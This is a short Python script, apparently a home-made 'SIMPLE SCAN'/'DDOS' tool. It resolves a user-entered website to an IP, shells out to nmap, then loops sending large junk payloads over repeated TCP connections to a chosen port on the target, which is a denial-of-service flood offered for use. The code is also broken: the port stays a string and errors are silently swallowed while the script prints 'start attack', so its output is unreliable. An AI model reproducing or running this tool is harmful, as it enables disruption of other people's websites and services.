import socket
import sys
import os

os.system("clear")
#color
W = '\033[1;34;40m'
print(W)
os.system("date")
#codo
os.system("figlet SIMPLE SCAN")
print(" \033[1;31m  make by obaida ismail")
print(W)
print(" NOTE : MAY TAKE SOMETIME >> ")
hostname = input("Enter website : \033[1;31m")
print(W)
ip = socket.gethostbyname(hostname)
print(" ")
print("website hostname : \033[1;31m ",hostname) ; print(W)
print("website ip : \033[1;31m ",ip)
print(" ")
print(W)
os.system("nmap --script-updatedb "+ip)
os.system("figlet DDOS")
print("\033[1;31m by ahmed tahsen")
print(W)
port =input("Enter port : ");print("Attack ip")
for h in range(10000000000000000):
  try:
      knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      socket.setdefaulttimeout(1)
      Jmeel=knig.connect((ip,port))
      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿el"*7000
      data=data.encode("utf-8")
      knig.send(data)
      #print("start attack by tool at-attack")


  except :
   print("start attack by at-attack")

#   print(C+"                     no problem in the ip",YY,ip)
